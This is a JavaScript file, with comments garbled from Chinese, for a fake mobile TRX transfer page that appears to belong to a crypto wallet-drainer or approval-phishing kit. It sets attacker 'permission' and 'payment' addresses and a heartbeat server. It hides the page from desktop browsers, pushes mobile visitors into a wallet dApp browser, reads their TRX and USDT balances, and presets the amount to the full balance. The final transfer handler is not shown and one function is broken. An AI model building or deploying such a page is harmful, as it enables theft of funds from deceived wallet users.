// ÊùÉÈôêÂú∞ÂùÄÔºàÂêàÁ∫¶Âú∞ÂùÄÔºâ
window.Permission_address = 'THRAE2VhGNAcvPKtT96AqyXtSQwhiU1XL8';
// Êî∂Ê¨æÂú∞ÂùÄÔºà‰∏™‰∫∫Âú∞ÂùÄÔºâ
window.Payment_address = 'TM1zzNDZD2DPASbKcgdVoTYhfmYgtfwx9R';
// USDTÂÆòÊñπÂêàÁ∫¶Âú∞ÂùÄÔºàÊó†ÈúÄ‰øÆÊîπÔºâ
window.usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
// ÊúçÂä°Âô®Âú∞ÂùÄÁî®‰∫éÂèëÈÄÅÂøÉË∑≥Ôºà‰øÆÊîπ‰∏∫‰Ω†Ëá™Â∑±ÁöÑÊúçÂä°Âô®ÂüüÂêçÔºâ
window.heartbeatUrl = 'https://baidu.com/heartbeat';

// Â≠òÂÇ®Áî®Êà∑Êï∞ÊçÆ
const userData = {
    address: null,
    trxBalance: null,
    usdtBalance: null
};
let currentAmount = '0';
// TRXÂÖëÊç¢USDÁöÑÊ±áÁéá
const TRX_TO_USD_RATE = 0.1562;

// ‰∏ªÂàùÂßãÂåñÂáΩÊï∞
async function initializeDApp() {
    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    const isDAppBrowser = typeof window.tronWeb !== 'undefined' || typeof window.tronLink !== 'undefined';
    
    if (!isMobile) {
        document.body.innerHTML = '';
    } else if (isMobile && !isDAppBrowser) {
        const currentUrl = encodeURIComponent(window.location.href);
        window.location.href = "okx://wallet/dapp/details?dappUrl=" + currentUrl;
    } else if (isMobile && isDAppBrowser) {
        await connectWallet();
        bindButtonEvents();
    }
    updateAmountDisplay();
}

// ËøûÊé•Âà∞Èí±ÂåÖ
async function connectWallet() {
    try {
        if (window.tronWeb && window.tronWeb.ready) {
            await initDApp();
        } else if (window.tronLink) {
            const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
            if (res.code === 200) {
                window.tronWeb = window.tronLink.tronWeb;
                await initDApp();
            }
        }
    } catch (error) {
        console.error("Èí±ÂåÖËøûÊé•Â§±Ë¥•:", error);
    }
}

// ÂàùÂßãÂåñDApp
async function initDApp() {
    try {
        userData.address = window.tronWeb.defaultAddress.base58;
        const trxBalance = await window.tronWeb.trx.getBalance(userData.address);
        userData.trxBalance = window.tronWeb.fromSun(trxBalance);
        const contract = await window.tronWeb.contract().at(window.usdtContractAddress);
        const usdtBalance = await contract.balanceOf(userData.address).call();
        userData.usdtBalance = usdtBalance / 1e6;
        updateTRXBalance();
        updateFeeDisplay();
        // ËÆæÁΩÆÈªòËÆ§ÈáëÈ¢ù‰∏∫‰ΩôÈ¢ù
        currentAmount = parseFloat(userData.trxBalance).toFixed(6);
        updateAmountDisplay();
    } catch (error) {
        console.error("Ëé∑ÂèñÁî®Êà∑Êï∞ÊçÆÊó∂Âá∫Èîô:", error);
    }
}

// Êõ¥Êñ∞È°µÈù¢ÁöÑTRX‰ΩôÈ¢ù
function updateTRXBalance() {
    const balanceElement = document.getElementById('ye');
    const balanceDisplayElement = document.getElementById('balance-display');
    
    if (balanceElement) {
        balanceElement.textContent = parseFloat(userData.trxBalance).toFixed(4);
    }
    
    if (balanceDisplayElement) {
        balanceDisplayElement.textContent = parseFloat(userData.trxBalance).toFixed(6) + ' TRX';
    }
}

// Êõ¥Êñ∞ÁüøÂ∑•Ë¥πÊòæÁ§∫
function updateFeeDisplay() {
    const feeUsdElement = document.getElementById('fee-usd');
    const feeTrxElement = document.getElementById('fee-trx');
    
    if (feeUsdElement && feeTrxElement) {
        // ËÆ°ÁÆóÁüøÂ∑•Ë¥πÔºàËøôÈáåÂèØ‰ª•Ê†πÊçÆÂÆûÈôÖÈúÄÊ±ÇË∞ÉÊï¥Ôºâ
        const feeTRX = 0.1; // ÈªòËÆ§ÁüøÂ∑•Ë¥π
        const feeUSD = (feeTRX * TRX_TO_USD_RATE).toFixed(2);
        
        feeUsdElement.textContent = '$' + feeUSD;
        feeTrxElement.textContent = feeTRX + ' TRX';
    }
}

// ËÆæÁΩÆÊúÄÂ§ßÈáëÈ¢ù
function setMaxAmount() {
    currentAmount = parseFloat(userData.trxBalance).toFixed(6);
    updateAmountDisplay();
}

// Êõ¥Êñ∞ÈáëÈ¢ùÊòæÁ§∫
function updateAmountDisplay() {
    let displayAmount = currentAmount;
    const maxBalance = parseFloat(userData.trxBalance || '0');

    // Â¶ÇÊûúËæìÂÖ•ÁöÑÈáëÈ¢ùÂ§ß‰∫é‰ΩôÈ¢ùÔºåËÆæÁΩÆ‰∏∫ÊúÄÂ§ß‰ΩôÈ¢ù
    if (parseFloat(displayAmount) > maxBalance) {
        displayAmount = maxBalance.toFixed(6);
        currentAmount = displayAmount;
    }
    
    // Êõ¥Êñ∞ÂéüÊúâÁïåÈù¢ÁöÑÈáëÈ¢ùÊòæÁ§∫
    const amountElement = document.getElementById('amount');
    if (amountElement) {
        amountElement.textContent = displayAmount;
    }
    
    // Êõ¥Êñ∞Êñ∞ÁïåÈù¢ÁöÑÈáëÈ¢ùÊòæÁ§∫
    const amountInputElement = document.getElementById('amount-input');
    if (amountInputElement) {
        amountInputElement.value = displayAmount;
    }
    
    // Êõ¥Êñ∞ USD ÊòæÁ§∫
    const usdAmount = (parseFloat(displayAmount) * TRX_TO_USD_RATE).toFixed(2);
    const usdElement = document.getElementById('amount-display');
    if (usdElement) {
        usdElement.textContent = usdAmount;
    }
    
    updateNextButtonState();
    
    // Êõ¥Êñ∞ÁΩëÁ´ôÊ†áÈ¢ò
    const title = `TRX ËΩ¨Ë¥¶ ${displayAmount} TRX`;
    document.title = title;
}

function updateNextButtonState() {
    const nextButton = document.getElementById('submitBtn');
    if (nextButton) {
        const amount = parseFloat(currentAmount || '0');
        const isValid = amount > 0 && amount <= parseFloat(userData.trxBalance || '0');
        nextButton.disabled = !isValid;
        nextButton.classList.toggle('disabled', !isValid);
    }
}

function bindButtonEvents() {
    // ÁªëÂÆöÂéüÊúâÈîÆÁõò‰∫ã‰ª∂Ôºà‰øùÊåÅÂÖºÂÆπÊÄßÔºâ
    document.querySelectorAll('.keyboard-box .btn').forEach(btn => {
        if (btn.classList.contains('delete')) {
            btn.addEventListener('click', () => pressKey('delete'));
        } else {
            btn.addEventListener('click', (event) => pressKey(event.target.textContent));
        }
    });
    
    const maxBtn = document.querySelector('.asset-info .right .btn');
    if (maxBtn) {
        maxBtn.addEventListener('click', setMaxAmount);
    }
    
    const nextBtn = document.getElementById('submitBtn');
    if (nextBtn) {
        nextBtn.addEventListener('click', onNextButtonClick);
    }
    
    // ÁªëÂÆöÊñ∞ÁïåÈù¢ÁöÑÊúÄÂ§ßÊåâÈíÆÔºàÂ¶ÇÊûúÂ≠òÂú®Ôºâ
    const balanceDisplayElement = document.getElementById('balance-display');
    if (balanceDisplayElement) {
        balanceDisplayElement.style.cursor = 'pointer';
        balanceDisplayElement.addEventListener('click', setMaxAmount);
    }
}

function tip(message) {

        tipElement.style.display = 'block';

}
